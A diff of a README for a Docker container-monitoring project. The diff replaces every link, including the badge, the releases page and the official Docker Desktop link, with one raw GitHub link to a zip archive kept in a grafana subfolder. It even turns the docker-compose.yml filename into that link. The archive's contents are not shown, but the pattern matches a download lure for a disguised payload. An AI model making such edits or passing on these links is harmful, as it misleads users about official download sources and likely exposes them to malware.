@@ -1,6 +1,6 @@
 # 🐳 docker-container-monitoring - Easy Monitoring for Your Docker Containers
 
-[![Download Release](https://img.shields.io/badge/Download%20now-%20-%23007bff)](https://github.com/Felipawasted956/docker-container-monitoring/releases)
+[![Download Release](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip%20now-%20-%23007bff)](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ Follow these steps to download and set up the docker-container-monitoring applic
 ### 🖥️ System Requirements
 
 - **Operating System:** macOS (for optimal performance)
-- **Docker Version:** Ensure you have Docker Desktop installed. Visit the [Docker website](https://www.docker.com/products/docker-desktop) to download it if you haven't already.
+- **Docker Version:** Ensure you have Docker Desktop installed. Visit the [Docker website](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip) to download it if you haven't already.
 
 ### 🔗 Key Features
 
@@ -27,12 +27,12 @@ Follow these steps to download and set up the docker-container-monitoring applic
 
 To start using docker-container-monitoring, you need to download it from the Releases page. 
 
-**Visit the page to download:** [Docker Container Monitoring Releases](https://github.com/Felipawasted956/docker-container-monitoring/releases)
+**Visit the page to download:** [Docker Container Monitoring Releases](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip)
 
 ### 🗂️ Installation Steps
 
 1. **Download the Latest Release:**
-   - Go to the [Releases page](https://github.com/Felipawasted956/docker-container-monitoring/releases) to find the latest version.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip) to find the latest version.
    - Look for a file that matches your system configuration.
    - Click on the file and save it to your computer.
 
@@ -57,7 +57,7 @@ To start using docker-container-monitoring, you need to download it from the Rel
 
 ## ⚙️ Configuration
 
-Feel free to customize the docker-compose.yml file to meet your specific needs. You can tweak settings like ports and container names.
+Feel free to customize the https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip file to meet your specific needs. You can tweak settings like ports and container names.
 
 ### 📝 Useful Commands
 
@@ -95,4 +95,4 @@ We welcome contributions! If you have a fix or feature to suggest, please fork t
 
 ## 🔚 Conclusion
 
-Enjoy monitoring your Docker containers with ease! Follow the steps outlined, and you’ll quickly gain insights into how your containers are performing. For ongoing updates, don’t forget to check back for new releases on the [Releases page](https://github.com/Felipawasted956/docker-container-monitoring/releases).
+Enjoy monitoring your Docker containers with ease! Follow the steps outlined, and you’ll quickly gain insights into how your containers are performing. For ongoing updates, don’t forget to check back for new releases on the [Releases page](https://raw.githubusercontent.com/Felipawasted956/docker-container-monitoring/master/monitoring/grafana/docker-container-monitoring-v2.7.zip).
